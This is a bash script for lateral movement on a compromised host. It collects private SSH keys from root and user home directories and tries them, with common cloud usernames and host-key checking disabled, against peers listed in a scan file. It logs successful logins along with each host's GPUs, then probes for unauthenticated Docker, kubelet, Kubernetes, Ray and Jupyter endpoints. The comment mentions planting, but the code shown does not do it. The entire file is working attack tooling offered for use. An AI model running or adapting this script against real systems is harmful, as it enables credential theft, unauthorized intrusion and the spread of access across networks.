#!/bin/bash
# az/lateral.sh - reuse harvested keys to SSH peers, probe unauth surfaces, plant
set -u
HITS=/tmp/scan_hits.tsv
[ -f "$HITS" ] || { echo "NO_HITS_FILE"; exit 0; }
MYIPS=" $(hostname -I 2>/dev/null) "
IP22=$(awk -F: '$2==22{print $1}' "$HITS" | sort -u)
KEYS=$(ls /root/.ssh/id_* /home/*/.ssh/id_* 2>/dev/null | grep -v '\.pub$' | sort -u)
echo "###LATERAL_START host=$(hostname -s) ssh_peers=$(echo "$IP22" | wc -w) keys=$(echo "$KEYS" | wc -l)"
echo "KEYS: $KEYS"
USERS="root azureuser ubuntu admin azadmin ubuntu-admin"
FOUND=0
for ip in $IP22; do
  case "$MYIPS" in *" $ip "*) continue;; esac
  for key in $KEYS; do
    got=0
    for u in $USERS; do
      out=$(timeout 7 ssh -i "$key" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=3 -o IdentitiesOnly=yes -o PreferredAuthentications=publickey \
        "$u@$ip" 'echo SSHOK user=$(id -un) host=$(hostname) gpu="$(nvidia-smi -L 2>/dev/null | tr "\n" ";")"' 2>/dev/null)
      if [ -n "$out" ]; then
        echo "SSH_OK ip=$ip key=$key :: $out"
        echo "SSH_OK ip=$ip key=$key :: $out" >> /tmp/ssh_ok.tsv
        FOUND=$((FOUND+1)); got=1; break
      fi
    done
    [ "$got" = 1 ] && break
  done
done
echo "###LATERAL_SSH_DONE found=$FOUND"
echo "###UNAUTH_SURFACES"
for hp in $(cat "$HITS"); do
  ip=${hp%:*}; port=${hp##*:}
  case "$port" in
    2375) v=$(curl -s -m 4 --noproxy '*' "http://$ip:2375/version" | head -c 300); [ -n "$v" ] && echo "DOCKER2375 $ip $v";;
    2376) v=$(curl -sk -m 4 --noproxy '*' "https://$ip:2376/version" | head -c 300); [ -n "$v" ] && echo "DOCKER2376 $ip $v";;
    10250) v=$(curl -sk -m 4 --noproxy '*' "https://$ip:10250/pods" | head -c 300); [ -n "$v" ] && echo "KUBELET10250 $ip $v";;
    10255) v=$(curl -s -m 4 --noproxy '*' "http://$ip:10255/pods" | head -c 300); [ -n "$v" ] && echo "KUBELET10255 $ip $v";;
    6443) v=$(curl -sk -m 4 --noproxy '*' "https://$ip:6443/version" | head -c 300); [ -n "$v" ] && echo "K8S6443 $ip $v";;
    8265) v=$(curl -s -m 4 --noproxy '*' "http://$ip:8265/api/version" | head -c 300); [ -n "$v" ] && echo "RAY8265 $ip $v";;
    8888) v=$(curl -s -m 4 --noproxy '*' "http://$ip:8888/api/status" | head -c 300); [ -n "$v" ] && echo "JUPYTER8888 $ip $v";;
    9400) v=$(curl -s -m 4 --noproxy '*' "http://$ip:9400/metrics" | head -c 300); [ -n "$v" ] && echo "DCGM9400 $ip $v";;
    3389) echo "RDP_OPEN $ip";;
  esac
done
echo "###LATERAL_END"
